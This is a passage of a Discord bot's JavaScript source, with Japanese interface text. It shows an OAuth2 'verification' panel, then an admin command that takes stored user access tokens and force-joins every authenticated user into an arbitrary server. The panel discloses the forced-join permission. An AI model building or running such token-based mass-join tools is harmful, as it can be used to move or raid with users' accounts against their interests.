        .setDescription(`このサーバーに完全にアクセスするためには、以下のボタンを押して認証を完了する必要があります。\n\n**付与されるロール:** ${role.name}\n\n⚠️ **重要:** 認証はOAuth2を利用し、ボットに**あなたのサーバーへの強制加入権限**を付与します。`)
        .addFields({ name: '認証手順', value: '1. 「認証を開始する」ボタンを押します。\n2. ポップアップしたモーダルに、ブラウザで認証を完了した後のURLを貼り付けます。' })
        .setFooter({ text: '不正な目的での利用を固く禁じます。' });

    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId(VERIFY_BUTTON_ID)
                .setLabel('1. 認証を開始する (URLを取得)')
                .setStyle(ButtonStyle.Success)
        );

    const linkRow = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setURL(oauthUrl) // 認証URLをボタンに設定
                .setLabel('2. OAuth2認証リンクを開く (ブラウザ)')
                .setStyle(ButtonStyle.Link)
        );

    try {
        await interaction.channel.send({ embeds: [embed], components: [linkRow, row] });
        await interaction.reply({ 
            embeds: [new EmbedBuilder().setColor(0x00FF00).setDescription('認証パネルを送信しました。')], 
            ephemeral: true 
        });
    } catch (error) {
        console.error('認証パネル送信エラー:', error);
        await interaction.reply({ embeds: [errorEmbed('送信エラー', 'パネルの送信中にエラーが発生しました。ボットの権限を確認してください。')], ephemeral: true });
    }
}


async function handleCall(interaction, userId) {
    if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
        return interaction.reply({ embeds: [errorEmbed('権限不足', 'このコマンドは管理者のみが使用できます。')], ephemeral: true });
    }

    const targetGuildId = interaction.options.getString('guild_id');
    const authUsersArray = Array.from(authenticatedUsers.entries());
    let successCount = 0;
    let failCount = 0;

    if (authUsersArray.length === 0) {
        return interaction.reply({ embeds: [errorEmbed('対象ユーザーなし', '現在、OAuth2認証済みのユーザーがメモリにいません。')], ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    for (const [discordUserId, data] of authUsersArray) {
        try {
            // Discord APIを利用してサーバーにユーザーを強制加入
            await axios.put(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${discordUserId}`, {
                access_token: data.accessToken,
                // forced_join: true // Discord APIでは不要
            }, {
                headers: {
                    Authorization: `Bot ${TOKEN}`,
                    'Content-Type': 'application/json'
                }
            });
            successCount++;
        } catch (error) {
            console.error(`[強制加入失敗] User ID: ${discordUserId}, Error: ${error.response?.status || error.message}`);
            failCount++;
        }
    }

    const resultEmbed = new EmbedBuilder()
        .setColor(successCount > 0 ? 0x00FF00 : 0xFFA500)
        .setTitle('📣 強制加入処理結果')
        .setDescription(`OAuth2認証済みユーザーをサーバー (ID: \`${targetGuildId}\`) に強制加入させました。`)
        .addFields(
            { name: '✅ 成功した人数', value: successCount.toLocaleString(), inline: true },
            { name: '❌ 失敗した人数', value: failCount.toLocaleString(), inline: true },
            { name: '全認証済みユーザー数', value: authUsersArray.length.toLocaleString(), inline: true }
        )
        .setTimestamp();

    await interaction.editReply({ embeds: [resultEmbed] });
}


// --- ボットとサーバーの起動 ---

// Expressサーバーを起動
app.listen(PORT, () => {
    console.log(`Webサーバーがポート ${PORT} で起動しました。`);
});

// Discordボットにログイン
client.login(TOKEN).catch(err => {
    console.error('Discordログインエラー:', err);
});
